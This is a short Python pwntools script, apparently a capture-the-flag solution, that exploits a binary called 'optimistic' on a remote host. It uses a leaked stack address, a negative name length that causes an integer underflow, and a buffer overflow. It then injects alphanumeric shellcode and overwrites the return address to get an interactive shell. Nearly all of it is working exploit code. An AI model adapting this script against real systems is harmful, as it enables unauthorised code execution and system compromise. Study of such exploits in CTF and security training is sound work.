from pwn import *

target = './optimistic'
elf = context.binary = ELF(target, checksec=False)
context.log_level = 'debug' 

p = remote("178.62.88.144", 30216)
#p = process('./optimistic')

p.sendlineafter(b":", "y")
p.recvuntil(b"Great! Here's a small welcome gift: ")
shellcode_addr = int(p.recvline(), 16)
shellcode_addr = shellcode_addr - 96
offset = 104

p.sendlineafter(b"Email:", b"sf")
p.sendlineafter(b"Age:", b"1234")

p.sendlineafter(b"Length of name:", b"-1")

shellcode = b""
shellcode += b"XXj0TYX45Pk13VX40473At1At1qu1qv1qwHcyt14yH34yhj5XVX1FK1FSH3FOPTj0X40PP4u4NZ4jWSEW18EF0V"
shellcode += b"0"*(104-len(shellcode))
shellcode += p64(shellcode_addr)

p.sendlineafter("Name:", shellcode)

p.interactive()
